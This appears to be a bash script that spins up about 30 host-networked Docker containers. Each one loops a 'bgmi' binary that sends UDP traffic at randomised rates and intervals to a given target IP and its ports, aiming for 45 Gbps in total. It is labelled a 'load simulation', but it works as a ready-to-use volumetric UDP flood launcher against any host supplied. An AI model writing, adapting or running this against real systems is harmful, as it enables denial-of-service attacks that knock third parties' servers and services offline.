#!/bin/bash
set -e

mkdir -p logs

if [ "$#" -lt 3 ]; then
  echo "Usage: $0 <target-ip> <start-port> <duration> [container-count=30]"
  exit 1
fi

TARGET="$1"
START_PORT="$2"
DURATION="$3"
CONTAINERS="${4:-30}"

MIN_RATE_MBPS=8
MAX_RATE_MBPS=45

# Calculate target per container
TOTAL_RATE_MBPS=5400  # 45 Gbps ≈ 5400 MBps
RATE_PER_CONTAINER=$((TOTAL_RATE_MBPS / CONTAINERS))

echo "[*] Starting 45Gbps UDP load simulation to $TARGET..."

# Build the Docker image
docker build -t udp-sim .

# Run multiple containers to distribute the load
for i in $(seq 1 "$CONTAINERS"); do
  PORT=$((START_PORT + i))
  RATE=$((RANDOM % (MAX_RATE_MBPS - MIN_RATE_MBPS + 1) + MIN_RATE_MBPS))
  LOGFILE="logs/bgmi-$i.log"

  docker run -d --name bgmi-runner-$i --network host udp-sim bash -c "
    while true; do
      echo \"[INFO][bgmi-$i] Benchmarking to $TARGET:$PORT @ ${RATE}MBps for ${DURATION}s\" >> /logs/bgmi-$i.log
      /usr/local/bin/bgmi --ip $TARGET --port $PORT --rate-limit ${RATE}MBps --duration $DURATION >> /logs/bgmi-$i.log 2>&1
      echo \"[INFO][bgmi-$i] Sleeping for random pause...\" >> /logs/bgmi-$i.log
      sleep \$((RANDOM % 3 + 2))  # Random sleep between 2 to 5 seconds
    done
  "
done

echo "[✓] Simulated 45Gbps UDP load via $CONTAINERS containers."
